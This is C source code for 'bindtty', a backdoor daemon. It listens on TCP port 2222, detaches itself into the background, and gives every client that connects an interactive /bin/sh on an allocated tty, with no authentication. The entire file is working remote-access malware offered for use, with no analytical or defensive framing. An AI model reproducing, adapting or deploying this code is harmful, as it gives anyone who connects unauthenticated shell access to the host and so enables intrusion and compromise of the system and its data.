/*
	bindtty - like bindshell, but with tty

	Features:
		- it can handle any number of clients
		- allocates tty for each session
		- no using termios.h/tty.h: compiles on most of gccs
		- linux specific ;(
	
	by sd <sd@sf.cz>
*/

#define HOME "/"

#define	TIOCSCTTY	0x540E
#define TIOCGWINSZ      0x5413
#define TIOCSWINSZ      0x5414
#define ECHAR	0x1d

#define PORT	2222

#define	BUF	32768


#include <sys/wait.h>
#include <sys/types.h>
#include <sys/resource.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <fcntl.h>

struct winsize {
	unsigned short ws_row;
	unsigned short ws_col;
	unsigned short ws_xpixel;
	unsigned short ws_ypixel;
};

/* creates tty/pty name by index */
void	get_tty(int num, char *base, char *buf)
{
	char	series[] = "pqrstuvwxyzabcde";
	char	subs[] = "0123456789abcdef";
	int	pos = strlen(base);
	strcpy(buf, base);
	buf[pos] = series[(num >> 4) & 0xF];
	buf[pos+1] = subs[num & 0xF];
	buf[pos+2] = 0;
}

/* search for free pty and open it */
int	open_tty(int *tty, int *pty)
{
	char	buf[512];
	int	i, fd;
	
	fd = open("/dev/ptmx", O_RDWR);
	close(fd);
	
	for (i=0; i < 256; i++) {
		get_tty(i, "/dev/pty", buf);
		*pty = open(buf, O_RDWR);
		if (*pty < 0) continue;
		get_tty(i, "/dev/tty", buf);
		*tty = open(buf, O_RDWR);
		if (*tty < 0) {
			close(*pty);
			continue;
		}
		return 1;
	}
	return 0;
}

/* to avoid creating zombies ;) */
void	sig_child(int i)
{
	signal(SIGCHLD, sig_child);
	waitpid(-1, NULL, WNOHANG);
}

void	hangout(int i)
{
	kill(0, SIGHUP);
	kill(0, SIGTERM);
}

int	main()
{
	int	pid;
	struct	sockaddr_in	serv;
	struct	sockaddr_in	cli;
	int	sock;
	
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock < 0) {
		perror("socket");
		return 1;
	}
	
	bzero((char *) &serv, sizeof(serv));
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = htonl(INADDR_ANY);
	serv.sin_port = htons(PORT);
	if (bind(sock, (struct sockaddr *) &serv, sizeof(serv)) < 0) {
		perror("bind");
		return 1;
	}
	if (listen(sock, 5) < 0) {
		perror("listen");
		return 1;
	}
	
	printf("Daemon is starting..."); fflush(stdout);
	pid = fork();
	if (pid !=0 ) {
		printf("OK, pid = %d\n", pid);
		return 0;
	}

	/* daemonize */
	setsid();
	chdir("/");
	pid = open("/dev/null", O_RDWR);
	dup2(pid, 0);
	dup2(pid, 1);
	dup2(pid, 2);
	close(pid);
	signal(SIGHUP, SIG_IGN);
	signal(SIGCHLD, sig_child);
	while (1) {
		int	scli;
		int	slen;
		slen = sizeof(cli);
		scli = accept(sock, (struct sockaddr *) &cli, &slen);
		if (scli < 0) continue;
		pid = fork();
		if (pid == 0) {
			int	subshell;
			int	tty;
			int	pty;
			fd_set	fds;
			char	buf[BUF];
			char	*argv[] = {"sh", "-i", NULL};
			#define MAXENV	256
			#define	ENVLEN	256
			char	*envp[MAXENV];
			char	envbuf[(MAXENV+2) * ENVLEN];
			int	j, i;
			char	home[256];

			/* setup enviroment */
			envp[0] = home;
			sprintf(home, "HOME=%s", HOME);
			j = 0;
			do {
				i = read(scli, &envbuf[j * ENVLEN], ENVLEN);
				envp[j+1] = &envbuf[j * ENVLEN];
				j++;
				if ((j >= MAXENV) || (i < ENVLEN)) break;
			} while (envbuf[(j-1) * ENVLEN] != '\n');
			envp[j+1] = NULL;

			/* create new group */
			setpgid(0, 0);

			/* open slave & master side of tty */
			if (!open_tty(&tty, &pty)) {
				char	msg[] = "Can't fork pty, bye!\n";
				write(scli, msg, strlen(msg));
				close(scli);
				exit(0);
			}
			/* fork child */
			subshell = fork();
			if (subshell == 0) {
				/* close master */
				close(pty);
				/* attach tty */
				setsid();
				ioctl(tty, TIOCSCTTY);
				/* close local part of connection */
				close(scli);
				close(sock);
				signal(SIGHUP, SIG_DFL);
				signal(SIGCHLD, SIG_DFL);
				dup2(tty, 0);
				dup2(tty, 1);
				dup2(tty, 2);
				close(tty);
				execve("/bin/sh", argv, envp);
			}
			/* close slave */
			close(tty);

			signal(SIGHUP, hangout);
			signal(SIGTERM, hangout);

			while (1) {
				/* watch tty and client side */
				FD_ZERO(&fds);
				FD_SET(pty, &fds);
				FD_SET(scli, &fds);
				if (select((pty > scli) ? (pty+1) : (scli+1),
				    &fds, NULL, NULL, NULL) < 0)
				    {
				    	break;
				}
				if (FD_ISSET(pty, &fds)) {
					int	count;
					count = read(pty, buf, BUF);
					if (count <= 0) break;
					if (write(scli, buf, count) <= 0) break;
				}
				if (FD_ISSET(scli, &fds)) {
					int	count;
					unsigned	char *p, *d;
					d = buf;
					count = read(scli, buf, BUF);			
					if (count <= 0) break;
					
					/* setup win size */
					p = memchr(buf, ECHAR, count);
					if (p) {
						unsigned char	wb[5];
						int	rlen = count - ((ulong) p - (ulong) buf);
						struct	winsize ws;

						/* wait for rest */
						if (rlen > 5) rlen = 5;
						memcpy(wb, p, rlen);
						if (rlen < 5) {
							read(scli, &wb[rlen], 5 - rlen);
						}

						/* setup window */
						ws.ws_xpixel = ws.ws_ypixel = 0;
						ws.ws_col = (wb[1] << 8) + wb[2];
						ws.ws_row = (wb[3] << 8) + wb[4];
						ioctl(pty, TIOCSWINSZ, &ws);
						kill(0, SIGWINCH);

						/* write the rest */
						write(pty, buf, (ulong) p - (ulong) buf);
						rlen = ((ulong) buf + count) - ((ulong)p+5);
						if (rlen > 0) write(pty, p+5, rlen);
					} else
						if (write(pty, d, count) <= 0) break;
				}
			}
			close(scli);
			close(sock);
			close(pty);

			waitpid(subshell, NULL, 0);
			vhangup();
			exit(0);
		}
		close(scli);
	}
}
